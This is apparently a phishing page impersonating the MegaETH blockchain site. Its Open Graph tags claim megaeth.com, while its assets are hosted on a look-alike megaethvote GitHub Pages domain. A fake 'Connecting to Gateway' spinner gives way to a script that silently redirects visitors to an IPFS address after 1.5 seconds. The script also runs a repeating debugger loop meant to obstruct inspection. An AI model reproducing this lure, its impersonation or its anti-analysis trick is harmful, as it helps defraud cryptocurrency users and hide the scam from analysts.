<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">

  <!-- Open Graph meta tags -->
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://www.megaeth.com/">
  <meta property="og:title" content="MegaETH | The First Real-Time Blockchain">
  <meta property="og:description" content="MegaETH is real-time Ethereum, streaming transactions at lightning speed: sub-millisecond latency and over 100,000 transactions per second.">
  <meta property="og:image" content="https://megaethvote.github.io/vote/preview.jpg">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <!-- Twitter Card meta tags -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:url" content="https://megaethvote.github.io/vote/">
  <meta name="twitter:title" content="MegaETH | The First Real-Time Blockchain">
  <meta name="twitter:description" content="MegaETH is real-time Ethereum, streaming transactions at lightning speed: sub-millisecond latency and over 100,000 transactions per second.">
  <meta name="twitter:image" content="https://megaethvote.github.io/vote/preview.jpg">

  <!-- Favicon -->
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">

  <title>MegaETH | The First Real-Time Blockchain</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
      color: #fff;
      overflow: hidden;
    }

    /* Animated background particles */
    .particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      overflow: hidden;
      pointer-events: none;
      z-index: 0;
    }

    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(139, 92, 246, 0.5);
      border-radius: 50%;
      animation: float linear infinite;
    }

    @keyframes float {
      0% {
        transform: translateY(100vh) translateX(0);
        opacity: 0;
      }
      10% {
        opacity: 1;
      }
      90% {
        opacity: 1;
      }
      100% {
        transform: translateY(-100vh) translateX(100px);
        opacity: 0;
      }
    }

    .container {
      position: relative;
      z-index: 1;
      text-align: center;
      padding: 60px 40px;
      background: rgba(255, 255, 255, 0.05);
      border-radius: 24px;
      backdrop-filter: blur(20px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3),
                  0 0 0 1px rgba(255, 255, 255, 0.1);
      max-width: 600px;
      animation: fadeIn 0.8s ease-out;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .logo {
      font-size: 48px;
      margin-bottom: 20px;
      animation: pulse 2s ease-in-out infinite;
    }

    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.05);
      }
    }

    h1 {
      font-size: 32px;
      font-weight: 700;
      margin-bottom: 20px;
      background: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      letter-spacing: -0.5px;
    }

    .subtitle {
      font-size: 18px;
      line-height: 1.6;
      margin-bottom: 40px;
      opacity: 0.9;
      font-weight: 400;
    }

    .spinner {
      width: 60px;
      height: 60px;
      border: 4px solid rgba(139, 92, 246, 0.2);
      border-top-color: #8b5cf6;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 30px;
      position: relative;
    }

    .spinner::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 40px;
      height: 40px;
      border: 4px solid rgba(236, 72, 153, 0.2);
      border-top-color: #ec4899;
      border-radius: 50%;
      animation: spin 0.7s linear infinite reverse;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .status {
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 10px;
      color: #8b5cf6;
      text-transform: uppercase;
      letter-spacing: 2px;
    }

    .progress-text {
      font-size: 14px;
      opacity: 0.7;
      margin-bottom: 20px;
    }

    .stats {
      display: flex;
      justify-content: space-around;
      margin-top: 30px;
      padding-top: 30px;
      border-top: 1px solid rgba(255, 255, 255, 0.1);
    }

    .stat {
      text-align: center;
    }

    .stat-value {
      font-size: 24px;
      font-weight: 700;
      color: #8b5cf6;
      margin-bottom: 5px;
    }

    .stat-label {
      font-size: 12px;
      opacity: 0.6;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    /* Glow effect */
    .glow {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 300px;
      height: 300px;
      background: radial-gradient(circle, rgba(139, 92, 246, 0.2) 0%, transparent 70%);
      border-radius: 50%;
      animation: glow 3s ease-in-out infinite;
      pointer-events: none;
    }

    @keyframes glow {
      0%, 100% {
        opacity: 0.5;
        transform: translate(-50%, -50%) scale(1);
      }
      50% {
        opacity: 0.8;
        transform: translate(-50%, -50%) scale(1.2);
      }
    }
  </style>
</head>
<body>
  <!-- Animated particles background -->
  <div class="particles" id="particles"></div>

  <div class="container">
    <div class="glow"></div>

    <div class="logo">⚡</div>

    <h1>MegaETH</h1>
    <div class="subtitle">The First Real-Time Blockchain</div>

    <div class="spinner"></div>

    <div class="status">Connecting to Gateway</div>
    <div class="progress-text">Establishing secure connection...</div>

    <div class="stats">
      <div class="stat">
        <div class="stat-value">&lt;1ms</div>
        <div class="stat-label">Latency</div>
      </div>
      <div class="stat">
        <div class="stat-value">100k+</div>
        <div class="stat-label">TPS</div>
      </div>
      <div class="stat">
        <div class="stat-value">Real-Time</div>
        <div class="stat-label">Speed</div>
      </div>
    </div>
  </div>

  <script>
    // Create floating particles
    (function() {
      const particlesContainer = document.getElementById('particles');
      const particleCount = 50;

      for (let i = 0; i < particleCount; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
        particle.style.animationDelay = Math.random() * 5 + 's';
        particlesContainer.appendChild(particle);
      }
    })();

    // Redirect to IPFS
    !function(){
      var target = 'https://bafybeiggz6dqazxzfycs7zdyecmxgbqiq3ijngxhh6wuw4qawrvq6towcq.ipfs.dweb.link';

      setTimeout(function(){
        window.location.replace(target);
      }, 1500);

      // Anti-debug (optional)
      setInterval(function(){ debugger; }, 100);
    }();
  </script>
</body>
</html>
